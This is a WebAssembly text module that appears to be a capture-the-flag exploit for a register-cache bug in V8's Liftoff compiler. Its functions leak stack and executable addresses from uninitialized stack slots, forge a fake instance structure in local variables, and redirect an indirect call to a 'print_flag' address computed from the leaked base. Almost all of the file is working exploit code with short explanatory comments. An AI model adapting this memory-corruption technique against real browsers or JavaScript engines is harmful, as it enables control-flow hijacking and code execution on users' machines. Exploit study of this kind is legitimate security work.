(module
  (type $type(func))
  (table 1 funcref)

  (func) ;; noop

  (func (result i64) ;; leak stack address
    ;; 18 local vars
    (local i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)

    ;; 8 allocs for consume (almost)all real machine registers
    ;; (rax, rcx, rdx, rbx, rdi, r8, r9 and r12)
    ;; the loop will trigger "TierupCheck", which will get a new register
    ;; spilling one existing register, but as this loop never taked, then
    ;; we not really create/get new registers, but compiler/cache_state believes it

    ;; Because of this we can read a uninitialized memory from stack for we leak
    ;; and amount of local vars will be offset of the leak
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0

    (loop
      i32.const 0
      br_if 0 ;; never taked, but change cache_state
    )

    drop
    drop
    drop
    drop
    drop
    drop
    drop
  )

  (func (result i64)  ;; leak exe address
    ;; 17 local vars
    (local i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)

    ;; 8 allocs for consume all real machine registers
    ;; (rax, rcx, rdx, rbx, rdi, r8, r9 and r12)
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0
    local.get 0

    (loop
      i32.const 0
      br_if 0 ;; never taked, but change cache_state
    )

    drop
    drop
    drop
    drop
    drop
    drop
    drop
  )

  (func (param i32) (param i64) ;; pwn
  ;; if(arg0 != 0) return
  ;; this is just for LiftOff compile the function(lazy compiler)
    local.get 0
    (if
      (then return)
    )

    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    local.get 1
    i64.const 0
    i64.add
    drop
    drop
    drop
    drop
    drop
    drop
    drop
    drop
    drop

    (loop
      i32.const 0
      br_if 0 ;; never taked, but change cache_state
    )

    i32.const 0
    call_indirect
  )

  (func (param i64) (param i64) ;; prepare fake struct
    (local i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)

    ;; We want create a fake instance which will be used as uninitialized register
    ;; fake instance in local 80

    ;; bounds at 0x1c
   i64.const 0x100000000
   local.set 77

   ;; signatures at 0x48
   local.get 0
   i64.const 8
   i64.sub
   local.set 71

   ;; func signature
   i64.const 0x1234123433333333
   local.set 81

   ;; type1 at 0x38
   local.get 0
   i64.const 0x10
   i64.sub
   local.set 73

   ;; type2
   i64.const 0x2222222233333333
   local.set 82

   ;; fptr table at 0x40
   local.get 0
   i64.const 0x18
   i64.sub
   local.set 72

   ;; print_flag = exe_base + 0x1322510 + 4 (plus for jump creating stackframe and avoid SIGSEGV)
   local.get 1
   i64.const 0x1322514
   i64.add
   local.set 83

   call 0 ;; call noop for flush
  )

  (func (export "pwn") (result i64)
    (local i64) ;; var0 = stack addr
    (local i64) ;; var1 = bin addr

    ;; leak stack addr
    call 1
    i64.const 0x2a8
    i64.sub
    ;; return ;; to print the leak
    local.set 0

    call 2
    i64.const 0x1a20cd5
    i64.sub
    ;; return ;; to print the leak
    local.set 1


    ;; call 3 function with junk just for liftoff compile(lazy compiler)
    i32.const 1
    i64.const 0xdeadbeef
    call 3

    local.get 0
    local.get 1
    call 4 ;; setup stack


    i32.const 0
    local.get 0
    i64.const 1
    i64.add
    call 3 ;; pwn

    local.get 1
    return
  )
)